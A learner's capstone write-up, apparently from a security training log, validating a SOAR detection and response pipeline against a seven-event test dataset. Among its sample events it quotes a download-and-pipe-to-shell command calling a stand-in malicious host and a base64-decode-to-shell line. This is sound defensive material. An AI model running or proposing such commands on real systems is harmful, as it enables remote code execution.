# Week 5 Day 7 - Final SOAR Automation Challenge (Capstone)

This capstone validates the full Week 5 pipeline under realistic mixed activity.

## Day Objective

Today I tested the hardened pipeline from Day 6 against a mini SOC assessment dataset that combines:

- benign noise
- suspicious admin-like activity
- duplicate alerts
- webshell-like behavior
- fileless/base64 execution
- approved critical containment flow

The goal was to verify not just detection, but operational quality: filtering, dedupe, escalation, safe execution, and auditability.

## Pipeline Stages Tested

- Event ingestion
- Deduplication
- Behavioral scoring
- Threat intelligence enrichment
- Verdict assignment
- Severity classification
- Case creation
- Routing and assignment
- Approval-gated response
- Dry-run execution
- Audit logging
- Pipeline summary metrics

## Dataset Used

I used the Day 7 challenge dataset with 7 total events:

1. systemd init process (benign baseline)
2. cron-driven bash echo task (low-signal admin-like)
3. nginx -> sh -> wget | sh (critical webshell-like behavior, approved)
4. duplicate of the webshell event
5. python3 fileless-style base64 decode from /dev/shm
6. sshd-parent bash execution from /tmp/update
7. curl healthcheck to example.com (clean/noisy)

## Run Output Summary (Observed)

Observed pipeline summary:

```json
{
  "run_started": "2026-05-03T18:16:01.138627+00:00",
  "events_seen": 7,
  "duplicates_skipped": 1,
  "cases_created": 3,
  "benign_skipped": 2,
  "below_threshold_skipped": 1,
  "response_success": 3,
  "response_failed": 0,
  "run_finished": "2026-05-03T18:16:01.741516+00:00"
}
```

Interpretation:

- Dedupe worked (duplicate webshell event removed)
- Noise handling worked (systemd and curl treated as benign)
- Thresholding worked (cron echo suppressed)
- All actionable cases executed in dry-run mode

## Case-by-Case Validation

### 1) Critical Webshell-Like Execution

- Process: sh
- Parent: nginx
- Command line: sh -c wget http://malicious-example.com/x.sh -O- | sh
- Severity: critical
- Approval: true
- Response: isolate_host (dry_run)

Why this mattered:

- Temp execution path
- Unusual parent process
- Download + pipe execution pattern
- Malicious domain enrichment from VirusTotal

Result: Correctly escalated and isolated in dry-run mode.

### 2) Fileless/Base64 Execution

- Process: python3
- Parent: apache2
- Command line: python3 -c 'import os; os.system("echo ZWNobyB0ZXN0 | base64 -d | sh")'
- Severity: medium
- Response: collect_context (dry_run)

Why this mattered:

- /dev/shm execution context
- Base64 decode behavior
- Web process parent context

Result: Correctly identified as malicious medium-risk behavior with context collection response.

### 3) Suspicious Temp Execution

- Process: bash
- Parent: sshd
- Command line: bash /tmp/update
- Severity: medium
- Verdict: suspicious
- Response: collect_context (dry_run)

Why this mattered:

- Temp path execution
- User-session style parent process
- No high-confidence malicious enrichment

Result: Correctly triaged as suspicious medium severity and routed for investigation.

## Noise Handling Review

The pipeline handled noise well:

- systemd/kernel-like activity was suppressed as benign
- duplicate command line for the webshell case was deduplicated
- low-signal cron/bash task was filtered by threshold logic
- clean-domain curl healthcheck did not create a case

## Capstone Checks

- [x] Summary counts are coherent and explainable
- [x] Duplicate webshell event was skipped
- [x] Benign systemd event was skipped
- [x] Critical approved case succeeded in dry-run mode
- [x] Medium cases executed collect_context
- [x] Low/noisy events did not create cases
- [x] Logs correlated correctly by case_id across cases.json, alerts.log, and success.log

## Strengths

- End-to-end workflow integrity across all SOAR stages
- Good false-positive control for benign and duplicate activity
- Safe response execution design with approval gate and dry-run mode
- Strong auditability with structured logs and summary metrics

## Limitations

- Low/informational events still appear in failed.log due to current execution call path
- Host/user/session context is limited for deeper triage decisions
- Lateral movement patterns are not yet first-class detection logic

## Future Improvements

- Add user context enrichment (username, tty/session, source IP)
- Add host identity and asset criticality weighting
- Add MITRE ATT&CK technique mapping to detections
- Add real case platform integration (TheHive/Jira/Sentinel case API)
- Add Slack/Teams routing for high-severity notifications
- Add persistent dedupe store across runs (not just in-memory)

## Grading Rubric (Assessed)

- Detection coverage: 10/10
- False-positive control: 10/10
- Automation safety: 10/10
- Case quality: 9/10
- Logging/auditability: 10/10
- SOC realism: 9/10

Final score: 58/60

## Week 5 Completion Map

### Day 1
Built detection automation from manual endpoint logic.

### Day 2
Added VirusTotal domain enrichment.

### Day 3
Created SOAR-style playbook logic with severity and response recommendations.

### Day 4
Added case creation, routing, assignment, deduplication, and alert logging.

### Day 5
Added controlled response execution with dry-run, approval gate, PID simulation, and success/failure logs.

### Day 6
Integrated everything into a config-driven pipeline with summary metrics.

### Day 7
Validated the full pipeline against realistic mixed activity.

## Final Takeaway

This capstone demonstrates that manual SOC investigation logic can be transformed into a safe, auditable, and scalable SOAR automation workflow with practical detection, enrichment, routing, and controlled response execution.

Week 5 is complete.
